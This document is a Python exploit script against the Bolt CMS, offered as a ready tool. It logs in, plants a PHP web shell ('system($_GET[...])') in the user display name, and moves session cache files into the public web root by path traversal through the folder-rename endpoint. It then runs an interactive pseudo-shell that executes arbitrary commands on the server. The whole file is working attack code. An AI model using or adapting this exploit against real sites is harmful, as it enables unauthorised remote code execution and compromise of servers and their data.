#!/usr/bin/python

import requests
import sys
import warnings
import commands
import signal
import re
import os
from bs4 import BeautifulSoup
from pwn import *

found = []

def def_handler(sig, frame):
	log.failure("Exiting...")
	sys.exit(1)

signal.signal(signal.SIGINT, def_handler)

if len(sys.argv) != 4:
	print("\n")
	log.info("Usage: python " + str(sys.argv[0]) + " url username password")
	print("\n")
	log.failure("Exiting...")
	sys.exit(1)

url = sys.argv[1]
username = sys.argv[2]
password = sys.argv[3]

request = requests.session()
p1 = log.progress("Retrieving CSRF token...")
page = request.get(url+"/bolt/login")
html_content = page.text
soup = BeautifulSoup(html_content, 'html.parser')
token = soup.findAll('input')[2].get("value")

login_info = {
    "user_login[username]": username,
    "user_login[password]": password,
    "user_login[login]": "",
     "user_login[_token]": token
   }

login_request = request.post(url+"/bolt/login", login_info)
p1.success("%s" % token)

aaa = request.get(url+"/bolt/profile")
soup0 = BeautifulSoup(aaa.content, 'html.parser')
token0 = soup0.findAll('input')[6].get("value")
data_profile = { 
	"user_profile[password][first]":password,
	"user_profile[password][second]":password,
	"user_profile[email]":"a@a.com",
	"user_profile[displayname]":"<?php system($_GET['test']);?>",
	"user_profile[save]":"",
	"user_profile[_token]":token0
		}
profile = request.post(url+'/bolt/profile',data_profile)

cache_csrf = request.get(url+"/bolt/overview/showcases")
soup1 = BeautifulSoup(cache_csrf.text, 'html.parser')
csrf = soup1.findAll('div')[12].get("data-bolt_csrf_token")

asyncc = request.get(url+"/async/browse/cache/.sessions?multiselect=true")
soup2 = BeautifulSoup(asyncc.text, 'html.parser')
tables = soup2.find_all('span', class_ = 'entry disabled')

p2 = log.progress("SESSION INJECTION...")
for all_tables in tables: 
	
	f= open("session.txt","a+")
	f.write(all_tables.text+"\n")
	f.close()
	num_lines = sum(1 for line in open('session.txt'))
	
	renamePostData = {
		"namespace": "root",
		"parent": "/app/cache/.sessions",
		"oldname": all_tables.text,
		"newname": "../../../public/files/test{}.php".format(num_lines),
		"token": csrf
	   }
	rename = request.post(url+"/async/folder/rename", renamePostData)
	
	try:
		url1 = url+'/files/test{}.php?test=ls%20-la'.format(num_lines)

		rev = requests.get(url1).text
		r1 = re.findall('php',rev)
		
		r2 = r1[0]
		if r2 == "php" : 
			fileINJ = "test{}".format(num_lines)
			
			log.info("FOUND  : "+fileINJ)
			found.append(1)
		
	except IndexError:
		pass

os.remove("session.txt")
if len(found) > 0:
	p2.success("Session found")
	
	new_name = 0
	print("\n")
	log.info("This is a root pseudo shell")
	log.info("Is not interactive, and only operates in the current folder.")
	while new_name != 'exit':
		username = requests.get(url+"/files/{}.php?test=whoami".format(fileINJ))
		username = username.text
		username.replace(" ","")
		username = re.findall('...displayname";s:..:"([\w\s\W]+)',username)
		username = (username)[0].split('";s')[0]
		hostname = requests.get(url+"/files/{}.php?test=hostname".format(fileINJ))
		hostname = hostname.text
		hostname.replace(" ","")
		hostname = re.findall('...displayname";s:..:"([\w\s\W]+)',hostname)
		hostname = (hostname)[0].split('";s')[0]
		curr_dir = requests.get(url+"/files/{}.php?test=pwd".format(fileINJ))
		curr_dir = curr_dir.text
		curr_dir.replace(" ","")
		curr_dir = re.findall('...displayname";s:..:"([\w\s\W]+)',curr_dir)
		curr_dir = (curr_dir)[0].split('";s')[0]
		inputs = raw_input(str(username).replace("\n","") + "@" + str(hostname).replace("\n","") + ":~" + str(curr_dir).replace("\n","") + "$ ")
		if inputs.replace("\n","") == "exit" :
			log.info("Exiting...")
			sys.exit(0)
		else:
			a = requests.get(url+"/files/{}.php?test={}".format(fileINJ,inputs))
			aa = a.text
			r11 = re.findall('...displayname";s:..:"([\w\s\W]+)',aa)
			print((r11)[0].split('";s')[0])
else:
	p2.failure("Session not found")
	log.failure("It was not possible to find a valid session, exiting...")
	sys.exit(1)
